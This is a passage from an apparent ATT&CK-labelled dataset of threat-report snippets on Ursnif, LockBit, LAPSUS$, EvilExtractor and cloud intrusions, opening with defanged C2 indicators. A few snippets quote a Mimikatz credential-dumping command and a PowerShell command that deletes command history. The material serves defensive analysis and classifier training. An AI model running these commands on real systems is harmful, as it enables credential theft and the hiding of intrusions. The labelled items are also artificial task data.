internalcheckssso[.]com Ursnif C2 weiqeqwns[.]com Ursnif C2 > wdeiqeqwns[.]com Ursnif C2 weiqeqwens[.]com Ursnif C2 weiqewqwns[.]com Ursnif C2 iujdhsndjfks[.]com Ursnif C2 trackingg-protectioon.cdn1.mozilla[.]net Ursnif C2 45.8.158[.]104 Ursnif C2 188.127.224[.]114 Ursnif C2 siwdmfkshsgw[.]com Vidar Stealer t[.]me/trampapanam Ursnif C2 Ijduwhsbvk[.]com Vidar Stealer nerdculture[.]de/@yoxhyp SystemBC C2 hgfiudtyukjnio[.]com SystemBC C2(overlaps with Ursnif C2 ISP) 188.127.224[.]46 Cobalt Strike C2 139.60.161[.]74 Redline C2 176.113.115[.]10 MITRE ATT&CK MITRE ATT&CK Tactic ID MITRE ATT&CK Technique Description MITRE ATT&CK Tactic Initial Access ID T1189 MITRE ATT&CK Technique Drive-by Compromise Description BatLoader is delivered via fake software installers MITRE ATT&CK Tactic User Execution ID T1204.002 MITRE ATT&CK Technique Malicious File Description The user launches the malicious MSI file MITRE ATT&CK Tactic Persistence ID T1547.001 MITRE ATT&CK Technique Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder Description As a result of BatLoader infection, ISFB malware creates the persistence via Registry Run Keys.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "Disable or Modify Tools Description Disabling Windows Defender notifications, Task Manager and Command Prompt MITRE ATT&CK Tactic Process Injection ID T1055 Description ISFB injects itself into explorer.exe as a result of successful BatLoader infection MITRE ATT&CK Tactic Unsecured Credentials ID T1552.001 MITRE ATT&CK Technique Unsecured Credentials: Credentials In Files Description The ISFB version observed is capable of accessing browser credentials and cookies, Thunderbird and Outlook profiles, POP3, SMTP passwords. ",
    "command": "",
    "labels": [
      "T1055",
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "In multiple engagements, this led CrowdStrike incident responders to identify that the malicious authentications into victim O365 tenants had originated from within the victim’s own network. ",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Armed with this information, CrowdStrike investigators were able to identify from which systems in these internal networks the threat actor was making authentications to O365.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "This led our responders to identify the occurrence of “credential hopping,” where the threat actor leveraged different credentials for each step while moving laterally through the victim’s network.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Use port forwarding capabilities built into SSH on the public-facing system to establish a Remote Desktop Protocol (RDP) session to an internal server (Server 1) using a domain service account. ",
    "command": "",
    "labels": [
      "T1021.001",
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "From Server 1, establish another RDP session to a different internal server (Server 2) using a domain administrator’s account. ",
    "command": "",
    "labels": [
      "T1021.001",
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Log in to O365 as a user with privileged access to cloud resources. ",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "However, the threat actor could have easily used a second domain administrator account or any other combination of accounts that would not be easily detected.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "But how had the threat actor succeeded in authenticating into victim O365 tenants, when multifactor authentication (MFA) had been enabled for every O365 user account at each victim organization investigated by CrowdStrike? Cookie Theft to Bypass MFA Even though the victims required MFA to access cloud resources from all locations, including on premises, the threat actor managed to bypass MFA through the theft of Chrome browser cookies.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor accomplished this by using administrative accounts to connect via SMB to targeted users, and then copy their Chrome profile directories as well as data protection API (DPAPI) data.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "The decryption of the cookies is believed to have taken place offline after exfiltrating the data via the clipboard in the threat actor’s RDP session. ",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Representation of lateral movement to cookie theft to O365 authentication CrowdStrike identified a similar TTP where the threat actor connected via RDP to a user’s workstation with the workstation owner’s account (e.g., connecting via RDP to user1-pc using the account user1).",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "After this, the threat actor navigated to the user’s Chrome history page and deleted the specific history items related to threat actor activity, leaving the rest of the user’s Chrome history intact. ",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "This threat actor abused access to accounts in the Cloud Solution Partner’s environment with legitimate delegated administrative privileges to then gain access to several customers’ O365 environments. ",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "This allowed CrowdStrike to demonstrate that a given user account was also authenticating to Active Directory from a given source IP address two years prior.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Because the user account was known to have recently been abused by the threat actor, and the source IP of the system in question was not one that account would typically be active on, the investigation led to the source system and ultimately resulted in the timeline of malicious activity being pushed back by years, with additional compromised systems even being discovered still running unique malware from that time period. ",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "TrailBlazer Attempted to blend in with a file name that matched the system name it resided on Configured for WMI persistence (generally uncommon in 2019) Used likely compromised infrastructure for C2 Masquerades its command-and-control (C2) traffic as legitimate Google Notifications HTTP requests TrailBlazer is a sophisticated malware family that provides modular functionality and a very low prevalence.",
    "command": "",
    "labels": [
      "T1047",
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "TrailBlazer WMI Persistence In the obfuscated example above, TrailBlazer (<FILENAME>.exe) would be executed when the system’s uptime was between 180 and 480 seconds. ",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "In each instance the tool was used, Shellbags data indicated that directories with random names of a consistent length were navigated to by the same user that ran the tool.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor established RDP sessions to internal servers using privileged accounts and then accessed the wiki using a different set of credentials.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "CrowdStrike observed the threat actor accessing the wiki as users who would be considered “non-privileged” from an Active Directory perspective but had access to sensitive data specific to the victim’s products or services. ",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "CrowdStrike recommends the following best practices for internal information repositories: Enable detailed access logging Ensure logs are centralized and stored for at least 180 days Create detections for anomalous activity such as access from an unusual location like a server subnet Enable MFA on the repository site, or provide access via Single Sign On (SSO) behind MFA O365 Built-in Service Principal Hijacking The threat actor connected via Remote Desktop from a Domain Controller to a vCenter server and opened a PowerShell console, then used the PowerShell command -ep bypass to circumvent the execution policy.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Using the Windows Azure Active Directory PowerShell Module, the threat actor connected to the victim’s O365 tenant and began performing enumeration queries.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "C:\\Users\\<user>\\AppData\\Local\\Microsoft\\AzureAD\\Powershell\\. While the logs didn’t include what data was returned by the queries, they did provide some insight such as the user account used to connect to the victim’s O365 tenant (which was not the same as the user the threat actor used to RDP to the vCenter server).",
    "command": "",
    "labels": [
      "T1021.001",
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "The commands included enumeration queries such as: ListAccountSkus ListPartnerContracts ListServicePrincipals ListServicePrincipalCredentials ListRoles ListRoleMembers ListUsers ListDomains GetRoleMember GetPartnerInformation GetCompanyInformation In this case, however, the most significant and concerning log entry was one that indicated the command AddServicePrincipalCredentials was executed.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "By running the commands from within the victim’s environment, MFA requirements were bypassed due to conditional access policies not covering Service Principal sign-ins at this point of time.8 However, as explained earlier, the threat actor managed to continue to access the victim’s cloud environment even when the victim enforced MFA for all connections regardless of source. ",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "While the bulk of the evidence for this activity came from the text-based O365 PowerShell logs, the NTUSER.DAT registry hive for the user that was running the PowerShell cmdlets also included information on the accounts that were used to authenticate to the cloud.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Attacker-created Service Principal First, the threat actor used a compromised O365 administrator account to create a new Service Principal with a generic name.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Remote Tasklist The threat actor attempted to remotely list running processes on systems using tasklist.exe.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "As tasklist uses WMI “under the hood,” this activity was captured by Falcon as SuspiciousWmiQuery events that included the query and the source system.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Additionally, the failed (not successful) process listing resulted in a DCOM error that was logged in the System.evtx event log under Event ID 10028.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Event ID 10028 showing failed execution of remote tasklist This remote process listing was consistently used by the threat actor targeting the same or similar lists of remote systems, and the owners of the targeted systems also happened to be the individuals with cloud access that the threat actor was interested in.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "While unproven, it’s possible the threat actor was running tasklist remotely on these systems specifically to see which of the target systems was running Google Chrome.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "However, the threat actor had knowledge of these accounts and used them on the correct systems, which further confirmed that the threat actor had advanced knowledge of the victim’s environment. ",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "After confirming the FTP accounts did not provide shell access into the environment, the threat actor began attempting to connect into the environment via VPN.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor attempted to log in to the VPN using several user accounts but was prevented from connecting, either due to not having the correct password, or due to having the correct password but not getting past the recently implemented MFA requirement.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "In one example, the threat actor connected into the victim’s environment via a VPN endpoint that did not have MFA enabled.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Once connected to the VPN, the threat actor connected via Remote Desktop to a Domain Controller and copied the DSInternals10 PowerShell module to the system.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "One of the credential theft techniques identified by CrowdStrike was the use of a PowerShell script to execute Mimikatz in-memory.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "Tactic Technique Observable Credential Access T1003.006 OS Credential Dumping: DCSync The threat actor obtained Active Directory credentials through domain replication protocols using the Get-ADReplAccount command from DSInternals Credential Access T1003.001: OS Credential Dumping: LSASS Memory The threat actor used a heavily obfuscated PowerShell script to execute the Mimikatz commands ‘privilege::debug sekurlsa::logonpasswords “lsadump::lsa /patch”‘ in-memory and encrypt the output Initial Access / Persistence T1078.003: Valid Accounts: Local Accounts A local account was used by the Threat Actor to establish a SSH tunnel into the internal network environment Initial Access / Persistence T1133:",
    "command": "",
    "labels": [
      "T1003.001",
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Remote Desktop Protocol The threat actor used both privileged and non-privileged accounts for RDP throughout the environment, depending on the target system Initial Access, Persistence T1078.004: Valid Accounts: Cloud Accounts The threat actor used accounts with Delegated Administrator rights to access other O365 tenants.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "The Threat actor also used valid accounts to create persistence within the environment. ",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Additional Cloud Credentials The threat actor added credentials to O365 Service Principals Persistence T1078.004: Valid Accounts: Cloud Accounts The threat actor created new O365 Service Principals to maintain access to victim’s environments Discovery T1057: Process Discovery The threat actor regularly interrogated other systems using tasklist.exe Reconnaissance T1595.001:",
    "command": "",
    "labels": [
      "T1057",
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "File Type MD5 SHA256 DLL PE 64bits ffmpeg.dll 27B134AF30F4A86F177DB2F2555FE01D C485674EE63EC8D4E8FDE9800788175A8B02D3F9416D0E763360FFF7F8EB4E02 DLL PE 64bits D3dcompiler_47.dll 82187AD3F0C6C225E2FBA0C867280CC9 11BE1803E2E307B647A8A7E02D128335C448FF741BF06BF52B332E0BBF423B03 Table.2 Initial dropped samples Once “ffmpeg.dll” is loaded, it tries to enumerate the current directory for the second DLL “d3dcompiler_47.dll”.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Fig.2 ffmpeg enumerating current directory ",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Fig.9 SQL queries for collection The info stealer also collects information on infected hosts, such as domain name, Hostname and OS Version, using NetWkstaGetInfo() API.",
    "command": "",
    "labels": [
      "T1005",
      "T1082",
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "The 3cxIngectionHunter script will simply crawl the filesystem looking for instances of the infected ffmpeg.dll file and report back if there is a match to the malicious hash.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "The payload connects to one of the C2 servers, downloads an infostealer and starts it. ",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The decryption is notably performed through the CryptUnprotectData API function that uses a different encryption key internally on every machine.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Registry Manipulates registry (lists, adds, deletes and exports keys). ",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Service Manipulates (creates, lists, starts, stops and deletes) services. ",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "Inject Performs payload injections through syscalls via mapping a shellcode to a remote process and creating a remote thread. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Although the tools themselves are not malicious, APT 40 attackers placed and used them from non-standard folders on victim systems during computer intrusion activity.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "[G0065] has used a variety of tactics and techniques and a large library of custom and open-source malware—much of which is shared with multiple other suspected Chinese groups—to establish initial access via user and administrator credentials, enable lateral movement once inside the network, and locate high value assets in order to exfiltrate data.",
    "command": "",
    "labels": [
      "T1005",
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "[T1189] and exploitation of public-facing applications [T1190] Access to valid",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "[T1078], compromised administrative [T1078.001] accounts Execution",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "[T1203] using lure documents that dropped malware exploiting various Common Vulnerabilities and Exposures (CVEs) ",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "User execution",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "[T1204] of malicious files [T1204.002] and links",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "[T1090.003], including the use of Tor [S0183] Use of domain typosquatting for C2 infrastructure [T1583.001] Archive [T1560], encrypt [T1532], and stage collected data locally",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "In most cases, these emails have a PDF document attached, which contains a link that the user must click to download the malware.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The target has to manually extract the file and execute it for the malware to run. ",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "We’ve found a variety of packers used for these executables, but their purpose is always to have a remote access trojan running on the victimized computer, usually by decrypting the payload and injecting it into legitimate processes.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "NSIS script for one of the droppers; the malicious files are highlighted The files Bonehead (encrypted RAT) and ShoonCataclysm.dll (dropper DLL) are written in the same folder and the DLL is run with rundll32.exe using Uboats as its argument.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "The result is a DLL that will be loaded and called in the same address space. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "There are anti-analysis checks; if they pass, the payload can be injected into a new process or loaded in the same process space. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Once it’s decrypted, it can be run in the same address space or injected into a different process, depending on the configuration. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "This packer supports various anti-analysis operations such as disabling Windows Defender, checking for security products, and detecting virtual environments and sandboxes. ",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Part of the main routine for the injection of the payload is shown in Figure 19. Figure 19.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The shellcode that performs the injection is contained in an array and is dynamically loaded.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Unlike the cases that were previously described, in this case the first-stage malware performs the injection and execution of the payload.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "It does so by using two shellcodes contained in the compiled AutoIt script: one to decrypt the payload and another to inject it into some process. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Concatenation of the payload The routine that decrypts the payload contains a small shellcode that is loaded with VirtualAlloc and executed.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Routine to decrypt strings Once the payload is decrypted, a shellcode with RunPE code is used to perform the injection.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Then an Internet Shortcut (.url) file is created in the Startup folder to execute the script.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "It can: Check for VMware and VirtualBox Delete the dropper executable Run the dropper continuously Download and execute files Terminate if a “Program Manager” window is found Read a binary from its resource section, write it to disk and execute it Modify the security descriptor (ACL) for the injected process For more information see this analysis by Morphisec where similar AutoIt droppers were used with Frenchy shellcode. ",
    "command": "",
    "labels": [
      "T1070.004",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "These provide several capabilities not only for remote control, but also for spying on targets: keylogging, screen capture, clipboard hijacking, exfiltration of files, and the ability to download and execute other malware, to name a few. ",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Another njRAT version used by the attackers is v0.7d (the “green edition”) which is a simpler version focused on spying capabilities: keylogging, taking screenshots, access to webcam and microphone, uploading and downloading files, and executing other binaries. ",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Windows Command ShellThe attackers have used RATs that can launch a command shell for executing commands. T1106Native",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "APIThe attackers have used API calls in their droppers, such as CreateProcessA, WriteProcessMemory and ResumeThread, to load and execute shellcode in memory. ",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "T1204.002User Execution: Malicious FileThe attackers have attempted to get users to execute malicious files masquerading as documents. PersistenceT1547.001Boot or Logon Initialization Scripts: Registry Run Keys / Startup",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "FolderThe attackers have used RATs that persist by creating a Run registry key or by creating a copy of the malware in the Startup folder. ",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "T1053.005Scheduled Task/Job: Scheduled TaskThe attackers have used scheduled tasks in their droppers and payloads to achieve persistence. ",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "T1562.001Impair Defenses: Disable or Modify ToolsThe attackers have used CyaX packer, which can disable Windows Defender. ",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "File DeletionThe attackers have used malware that deletes itself from the system. ",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "T1112Modify RegistryThe attackers have used RATs that allow full access to the Registry, for example to clear traces of their activities. ",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "T1055.002Process Injection: Portable Executable InjectionThe attackers have used droppers that inject the payload into legitimate processes such as RegAsm.exe, MSBuild.exe and more. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "DiscoveryThe attackers have used various RATs that can browse file systems. ",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "DiscoveryThe attackers have used various RATs with modules that show running processes. ",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "T1012Query RegistryThe attackers have used various RATs that can read the Registry. ",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "DiscoveryThe attackers have used various RATs that gather system information such as computer name and operating system during the initial infection. T1016System Network Configuration DiscoveryThe attackers have used various RATs that can collect the IP address of the victim machine. ",
    "command": "",
    "labels": [
      "T1016",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "User DiscoveryThe attackers have used various RATs that retrieve the current username during initial infection. ",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "T1021.001Remote Services: Remote Desktop ProtocolThe attackers have used various RATs that can perform remote desktop access. ",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "DataThe attackers have used various RATs that can access and modify data from the clipboard. T1005Data from Local SystemThe attackers have used various RATs that can access the local file system and upload, download or delete files. ",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Cloning of git repositories and extraction of sensitive API Keys.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Using compromised credentials to access corporate VPNs.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Disruption or destruction to victim infrastructure to hinder analysis and consume defensive resource. ",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Lateral Movement In one incident LAPSUS$ were observed to sporadically move through the victim environment via RDP in an attempt to access resources deeper in the victim environment.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "In some instances, victim controlled hostnames were revealed including the host “VULTR-GUEST” which refers to infrastructure hosted on the private cloud service, Vultr[3]. ",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Impact NCC Group has observed disruption and destruction to client environments by LAPSUS$ such as shutting down virtual machines from within on-premises VMware ESXi infrastructure, to the extreme of mass deletion of virtual machines, storage, and configurations in cloud environments making it harder for the victim to recover and for the investigation team to conduct their analysis activities. ",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "These credentials are generated and stored in the memory of the LSASS process when a user initiates the interactive logon to the machine such as console logon or RDP, runs a scheduled task or uses remote administration tools.",
    "command": "",
    "labels": [
      "T1003.001",
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "Injecting deceptive credentials on production endpoints: Production endpoints should be injected with deceptive credentials at multiple places like LSASS process memory, Credential Manager, browser credentials, etc., to increase the possibility of these credentials being picked up and used to pivot to decoy systems in the network.",
    "command": "",
    "labels": [
      "T1055",
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Network Deception – Example 1: Injecting NETONLY credentials into LSASS process memory LSASS process memory is one of the prime targets for attackers, as well as malware armed with lateral movement capabilities since it caches a variety of credentials.",
    "command": "",
    "labels": [
      "T1003.001",
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Credential extraction from the LSASS process requires opening a read handle to the process itself which is closely monitored by EDR products but there are stealthier ways around it. ",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "One of the primary tasks towards achieving credential-based deception is to stage the deceptive credentials in LSASS process memory.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "This can be accomplished on the production and decoy systems by executing a trivial credential injection code which uses the CreateProcessWithLogonW Windows API with the specified crafted credentials.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "The below shows the example code calling the API with the specified credentials which is also visible when credentials are extracted with Mimikatz. ",
    "command": "",
    "labels": [
      "T1003.001",
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Figure 20 – Injecting credentials into LSASS memory One of the parameters to CreateProcessWithLogonW is “dwLogonFlags” which should be specified as LOGON_NETCREDENTIALS_ONLY as shown in the code above.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Below is a code snapshot from credential extraction tool Mimikatz, using a similar approach to forge a logon session and replacing the credentials with the supplied ones while executing Pass-the-Hash attacks. ",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "Figure 21 – Mimikatz code for PTH attack Network Deception – Example 2: Configure deceptive hostnames for decoy VMs Attackers or malware moving laterally inside the network might do a recon for interesting hostnames via nbtstat/nbtscan.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Figure 26 – Deceptive credentials usage for authentication in the domain One such example event of successfully logging on to the decoy system is as shown below: Figure 27 – Alert send to administrator on using deceptive credentials MITRE ATT&CK Techniques: Credential theft attacks discussed here are mapped by MITRE as below: Technique ID Technique Name Description T1003.001 LSASS Process Memory Attackers may attempt to access LSASS process memory to extract credentials as it stores a variety of credentials.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "DoS flood attackIn a DoS flood attack, the attacker uses one computer to flood a remote DNS server with false traffic.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The attacker orchestrates the attack by directing all devices to send traffic simultaneously to one server, generating a DoS status. ",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Many people don’t protect their router using a complex password — or just safeguard it using the default factory credentials.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "By doing this, each infected device and the remote attacker’s server have created a covert channel that can be used to exfiltrate data from the victim device or deliver more malware, such as ransomware, to the target device. ",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "title: EvilExtractor – All-in-One Stealer url: https://www.fortinet.com/blog/threat-research/evil-extractor-all-in-one-stealer Affected platforms: WindowsImpacted parties: Any organizationImpact: Controls victim’s device and collects sensitive informationSeverity level: Critical EvilExtractor (sometimes spelled Evil Extractor) is an attack tool designed to target Windows operating systems and extract data and files from endpoint devices.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "We recently reviewed a version of the malware that was injected into a victim’s system and, as part of that analysis, identified that most of its victims are located in Europe and America.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "If not, it uses the following command to delete the data in PSReadline and terminate: DEL \\\"$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadline\\*\\\" -Force –Recurse It then compares the product model to see if it matches any of the following: VirtualBox, VMWare, Hyper-V, Parallels, Oracle VM VirtualBox, Citrix Hypervisor, QEMU, KVM, Proxmox VE, or Docker, as shown in Figure 6.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "It also checks the victim’s hostname against 187 names from VirusTotal machines or other scanner/virtual machines, as shown in Figure 7. Figure 6.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Virtual environment and scanner/virtual machine checking After passing the environment check, EvilExtractor downloads three components from http://193[.]42[.]33[.]232 used for stealing data.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The threat actors also expressed interest in other access methods such as RDP, VPN and corporate email credentials.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "LockBit 2.0 Tactics, Techniques and Procedures Technically speaking, we have observed LockBit 2.0 affiliates leveraging the following tactics, techniques and procedures: TA0001 Initial Access T1078 Valid Accounts Credentials that have either been reused across multiple platforms or have previously been exposed.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Additionally, this includes VPN accounts – not just domain and local accounts. ",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "LockBit 2.0 can be executed via scheduled tasks. ",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "Command and Scripting Interpreter LockBit 2.0 is typically executed via command line arguments via a hidden window. ",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "It was quite common to see scheduled tasks used to create persistence for the ransomware executable, PsExec, and occasionally some defense evasion batch scripts. ",
    "command": "",
    "labels": [
      "T1053.005",
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Valid Accounts Compromised accounts may be used to maintain access to the network. ",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Impair Defenses: Disable or Modify Tools Windows Defender, other anti-malware solutions and monitoring tools are disabled utilizing a process explorer tool, a batch script or a specially crafted command line script. ",
    "command": "",
    "labels": [
      "T1059.003",
      "T1562.001"
    ]
  },
  {
    "type": "text",
